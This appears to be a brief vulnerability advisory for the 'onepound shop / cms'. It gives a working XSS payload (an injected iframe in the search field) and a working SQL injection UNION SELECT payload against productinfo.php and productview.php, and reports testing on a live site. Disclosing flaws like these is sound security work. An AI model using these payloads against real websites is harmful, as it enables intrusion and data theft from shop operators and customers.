:: Vulnerabilities

#1 XSS
Several parts of the onepound shop / cms don't filter out HTMl or Java Script code, e.g. the search field.

Example for HTML code:
"><iframe src=http://www.google.de></iframe>

Example for typical XSS URL:
http://some-cool-domain.tld/productinfo.php?keyword="><iframe src=http://www.google.de></iframe>
--------------------------------------------------------------------------------------------------------


#2 SQL Injection
On 13th July 2009 Affix <root@root-the.net> discovered that the products.php file is vulnerable for SQL injections.
Browsing their shop systems and testing stuff revealed also other possibilities for injecting SQL stuff. I was not able to find out if the other files were already vulnerable then Affix published his advisory.

Vulnerable URLs:
http://some-cool-domain.tld/productinfo.php?id=[SQL injection]
http://some-cool-domain.tld/productview.php?id=[SQL injection]

Example for injecting SQL stuff:
http://some-cool-domain.tld/productinfo.php?id=236+AND+1=2+UNION+SELECT+1,concat(user()),concat(user()),4,5,concat(user()),concat(user()),concat(user()),9,10,11,12,13,14,15--
(Tested on a live website using onepound shop / cms.)

:: Additional information
Sadly I was not able to gather more information about affected versions or products they are selling. Quick checks shows that many websites are using their shop / cms and are vulnerable in many ways.
